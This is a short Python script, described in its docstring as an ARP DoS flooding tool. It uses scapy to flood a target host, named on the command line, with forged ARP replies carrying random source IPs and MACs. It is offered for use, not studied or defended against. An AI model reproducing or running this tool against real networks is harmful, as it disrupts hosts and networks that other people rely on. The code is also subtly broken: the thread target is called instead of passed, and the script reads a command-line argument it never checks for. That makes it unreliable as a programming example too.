'''
A program that performs ARP DOS attacks by flooding

Author: Raz Crimson
'''
import time
import sys

from threading import Thread

from scapy.layers.l2 import ARP
from scapy.sendrecv import send
from scapy.volatile import RandIP, RandMAC


PING_SPAM_DURATION = 100

class ARPSpammer:

    def __init__(self, dst: str, spam_duration, *, subnet_bits=24, thread_count=20):
        self.dst = dst
        self.subnet_bits = subnet_bits
        self.__thread_count = thread_count
        self.__spam_duartion = spam_duration
        self.__threads = []
                
    def __generate_packet(self):
        return ARP(op=2, pdst=self.dst, psrc=RandIP(f"{self.dst}/{self.subnet_bits}"), hwsrc=RandMAC())
                
    def spam_pings(self, timeout=100):
        start_time = time.time()
        while time.time() - start_time < timeout:
            pkt = self.__generate_packet()
            print(pkt.summary())
            send(pkt, verbose=False)
        
    def __generate_threads(self):
        for _ in range(self.__thread_count):
            thread = Thread(target=self.spam_pings(), args=(self.__spam_duartion,), daemon=True)
            thread.start()
            self.__threads.append(thread)
        
    def start(self):
        try:
            self.__generate_threads()
            while True:
                for thread in self.__threads:
                    if thread.is_alive():
                        continue
                break
        except KeyboardInterrupt:
            pass

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('ERROR: No destination to Ping')
        exit(1)
    else:
        print(f'Press Ctrl + C To Terminate\nDestination: {sys.argv[1]}')

    if len(sys.argv) >= 3 and isinstance(int(sys.argv[3]), int):
        print(f'Setting {sys.argv[3]} as the spam durationping count...(Negative indicated infinite requests)')
        PING_SPAM_DURATION = int(sys.argv[3])

    pg = ARPSpammer(sys.argv[1], spam_duration=PING_SPAM_DURATION)

    try:
        pg.start()
    except PermissionError:
        print('ERROR: Please run it as root user.')
